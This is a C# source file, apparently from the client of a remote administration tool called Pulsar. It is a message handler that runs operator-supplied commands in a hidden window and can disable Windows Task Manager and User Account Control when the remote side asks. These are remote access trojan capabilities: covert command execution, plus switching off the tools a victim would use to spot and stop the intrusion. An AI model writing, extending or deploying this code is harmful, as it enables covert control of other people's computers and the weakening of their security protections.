﻿using Pulsar.Common.Messages;
using Pulsar.Common.Networking;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Messages.QuickCommands;
using System.Diagnostics;
using Pulsar.Client.Helper.TaskManager;
using Pulsar.Client.Helper.UAC;

namespace Pulsar.Client.Messages
{

    public class QuickCommandHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoSendQuickCommand || message is DoEnableTaskManager || message is DoDisableTaskManager || message is DoDisableUAC || message is DoEnableUAC;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoSendQuickCommand msg:
                    Execute(sender, msg);
                    break;

                case DoEnableTaskManager msg:
                    Execute(sender, msg);
                    break;

                case DoDisableTaskManager msg:
                    Execute(sender, msg);
                    break;

                case DoDisableUAC msg:
                    Execute(sender, msg);
                    break;

                case DoEnableUAC msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoSendQuickCommand message)
        {
            client.Send(new SetStatus { Message = "Successful Quick Command" });

            Debug.WriteLine(message.Host + " " + message.Command);

            //execute a new powershell with the command
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = message.Host;
            startInfo.Arguments = message.Command;
            process.StartInfo = startInfo;
            process.Start();
        }

        private void Execute(ISender client, DoEnableTaskManager message)
        {
            client.Send(new SetStatus { Message = "Task Manager Enabled" });
            TaskManager.Enable();
        }

        private void Execute(ISender client, DoDisableTaskManager message)
        {
            client.Send(new SetStatus { Message = "Task Manager Disabled" });
            TaskManager.Disable();
        }

        private void Execute(ISender client, DoDisableUAC message)
        {
            client.Send(new SetStatus { Message = "UAC Disabled. Requires Restart" });
            UACToggle.DisableUAC();
        }

        private void Execute(ISender client, DoEnableUAC message)
        {
            client.Send(new SetStatus { Message = "UAC Enabled. Requires Restart" });
            UACToggle.EnableUAC();
        }
    }
}
